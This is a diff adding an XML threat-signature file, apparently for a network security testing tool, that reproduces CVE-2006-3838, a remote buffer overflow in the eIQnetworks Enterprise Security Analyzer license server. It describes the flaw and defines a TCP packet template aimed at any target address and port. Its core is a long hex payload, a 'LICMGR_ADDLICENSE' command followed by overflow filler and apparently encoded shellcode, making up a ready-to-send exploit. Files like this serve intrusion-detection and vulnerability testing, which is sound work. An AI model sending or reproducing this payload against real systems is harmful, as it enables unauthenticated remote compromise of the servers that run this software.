@@ -1,0 +1,79 @@
+<?xml version="1.0" encoding="utf-8"?>
+<threatSignature>
+  <ThreatProperties>
+    <ExecDesc display="true" value="eIQnetworks Enterprise Security Analyzer License Manager Remote Buffer Overflow Vulnerability"/>
+    <EngDesc display="true" value="This threat sends a malicious payload to execute on vulnerable installations of&#13;&#10;eIQnetworks Enterprise Security Analyzer via a flaw in EnterpriseSecurityAnalyzer.exe. &#13;&#10;eIQnetworks Enterprise Security Analyzer License Server is a server application that &#13;&#10;typically listens on TCP port 10616."/>
+    <Intent display="true">
+      <item value="Buffer_Overflow"/>
+      <item value="Crashing"/>
+      <item value="Command_Injection"/>
+    </Intent>
+    <Protocol display="true" value="Proprietary"/>
+    <Type_Of_Equipment display="true">
+      <item value="Application"/>
+    </Type_Of_Equipment>
+    <Known_Vendors_Affected display="true">
+      <item value="eIQnetworks"/>
+    </Known_Vendors_Affected>
+    <Known_Products_Affected display="true">
+      <item value="eIQnetworks_Enterprise_Security_Analyzer"/>
+    </Known_Products_Affected>
+    <Known_Versions_Affected display="true">
+      <item value="eIQnetworks_Enterprise_Security_Analyzer_2.1"/>
+    </Known_Versions_Affected>
+    <Credit display="true" value="http://www.milw0rm.com/exploits/2074"/>
+    <CVEID display="true" value="CVE-2006-3838"/>
+    <bugtraqID display="true" value="19163"/>
+    <OSVDB display="true" value="27526 "/>
+    <Author display="true" value="Mike Davis"/>
+    <ID value="0000010cb877cc0500c000a80001003c456d9f84" display="true"/>
+    <Revision value="1" display="true"/>
+    <Safe display="true" value="true"/>
+    <ServerSideAttack display="true" value="false"/>
+    <SoftwareRevision display="true" value="2.0"/>
+    <Suite display="true" value="Standard"/>
+    <RunOnce display="false" value="false"/>
+    <Valid_Traffic display="false" value="true"/>
+    <AccessVector display="false" value="remote"/>
+    <AccessComplexity display="false" value="low"/>
+    <Authentication display="false" value="not-required"/>
+    <ConfImpact display="false" value="partial"/>
+    <IntegImpact display="false" value="complete"/>
+    <AvailImpact display="false" value="partial"/>
+    <ImpactBias display="false" value="integrity"/>
+    <FirstAdded display="false" value=""/>
+    <LastModified display="false" value="632896151366577500"/>
+    <SigStyle display="false" value=""/>
+    <targetNode display="false" value=""/>
+    <SigProtocol display="false" value=""/>
+    <Rate display="false" value=""/>
+    <Regex display="false" value=""/>
+    <Created value="1154146094" display="false"/>
+  </ThreatProperties>
+  <Variables>
+    <NamedVar name="sourceMAC" type="ImperfectControls.MacAddress" value="null" index="B"/>
+    <NamedVar name="destMAC" type="ImperfectControls.MacAddress" value="null" index="C"/>
+    <NamedVar name="sourceIP" type="ImperfectControls.IPv4Address" value="null" index="E"/>
+    <NamedVar name="destIP" type="ImperfectControls.IPv4Address" value="null" index="D"/>
+    <NamedVar name="destPort" type="ImperfectControls.Port" value="null" index="Z"/>
+  </Variables>
+  <Loops>
+    <for index="A">
+      <for index="B"/>
+      <for index="C"/>
+      <for index="E"/>
+      <for index="D"/>
+    </for>
+  </Loops>
+  <PostScript/>
+  <Output index="A" Count="">
+    <Ethernet srcMac="$sourceMAC" destMac="$destMAC" pktType="0800">
+      <IP Version="4" InternetHeaderLength="" TypeofService="" TotalLength="" Identification="" FragmentOffset="" TTL="" Protocol="06" HeaderChecksum="" srcIP="$sourceIP" destIP="$destIP" options="" CE="" DF="" MF="">
+        <TCP srcPort="@random(1026,65535)" destPort="$destPort" SeqNumber="" AckNumber="" HeaderLength="" WindowSize="" Checksum="" UrgentPointer="" Options="" Payload="4C49434D47525F4144444C4943454E534526FC99499B4A2F4A994247FCF8932F92F8D6972FFDF8F9464B91929837372F96434999F93F939899F547F5909FFD42FD98FD9993413F9F48F590F5934B96F84B98F94B41973F4890D627FCF8904ED64946F84B4743D64F909243F943279143FD9F439096FC9FD64B43989B9B9F92424B924A91F59B974848424A9B4F4891F84B46FC469FFD9F93484E9091414A439B48FD4F9F379299F94B9293FC4B42D6FD4F4B4B919147434A439742372F909B484191939BF84F3F4ED692484E9148969B9398F9FD99F5379FD6D6429B90934E4149D64B962F9646279B42F9F8919F98964FFC97424E9F279F42D69FF549434B4797F89937432F2F4A3F4F9F489F4F48419342F5F84192924793474F4298279147984A93939B49D69242FD903F99414798969F42FD464F434A47474F2742474B374E414999414247F599474E4643419691489791F9439BF937989699413FD6FC464B92FC473FFDFD499098994F4B9FD64A37273F4143414B9B2F43F9D63743F547479947D6FC4B434E9B3F479B3FF5FC9BFD9141984197479896F84698994F4A93F5433F42F84E49494B374F4A92424F9199462FD64A9F37FC99464A3FF99391479693FD4F4BFD964397924B279099D6494F4E4F2F2747979B4347909099474E999FD69FFC9F48489F4BF9464A483F9B4247FC419F91FDF5FDFC4B4397FD4B96F937489848F84E934B37F843904A3796F99F493F4292462F4F4E494A2F929B4948F84349D6FD4148F5969093F890F8499B27FCF546974A9347994292F54241FCFD42492F97469F90F5F99F96274191272F4693F9903748FC9299F548994E419248FC4F93F837D64E90D6424842909B4943F949972F924F499B27279B4B4B4E3F9B4890F999F8F82790F537D6F992F5964696F849499F4F4148FD47924199F996F8FCD63FF54E4FFDD6FD4827FC4AFC419B494E4990964EF896929343FCD69293424A2F4AFC379B98934F984B43969999374F27FD2F434A41F591D6964B9F46994B3F48964A9B91D64298374E9BF548929FFCF54B9B3F424F98484F414E37F9F942914F494298464797434F4E4191F827D6FD922FF53F47FD989837974E464A4E972F96FC91373F4A9027FDD64B98924BFC92FD3F439137979247F93FD6F847964B2F3F3F4742FC96494342D6939F49D6FD422F4B3F4B4FF5909B924F49464827FD4792F5494B9F414B9B924891439B27D64A4192F5FC474EFD99FDF5469F49F82F9B99F898FC4346F99B472727F54B27919343D6F546919992F99098429749422FFC2793FC91F59327FD904E4647FC4690F94F91424BD64F2FF9429FF9F548D62F9249489F4942379BD6986A4859D9EED97424F45B8173136D56F7E083EBFCE2F4913C1CAD85AF081F92367C8C49727CA551DD8BE51557186B224E7CBF4D571CA9E6627CE183673779C1D237946A973DED6C941C145602D3C818B37CBF49571C86E65ABC6B324AF60B6E7A7C690172EB81AE672C84E615C76B2D5A7C9071FB7CA065089F6E23581BB0928091B30B3EC4D2052184D232020830059D1A1C5606083632DF1286ECBBFFE2383CF51FBD3E2EE998FBA01FBB05A4B33E15A4A33EA92788ADFEF7850B3EE7010B057E01F83E1B19C736A01FBB3CE7B138A92786073291880E3B9DB0347F3B698A3CB3698F673713C7C37E1D9314DA1E2F7A7A9A55FD5C4B052409537BA982C89280ACB73F07A6B10757A6B13807083005FB2EE5A305083607A908D792869F0714908E1F1852083692210B1FBD3E076A6909A41FBBA927E0DC64DB7726" CWR="" ECE="" URG="" ACK="" PSH="" RST="" SYN="" FIN="" RES1="" RES2="" RES3="" RES4=""/>
+      </IP>
+    </Ethernet>
+  </Output>
+  <Input>
+    <Ethernet/>
+  </Input>
+</threatSignature>
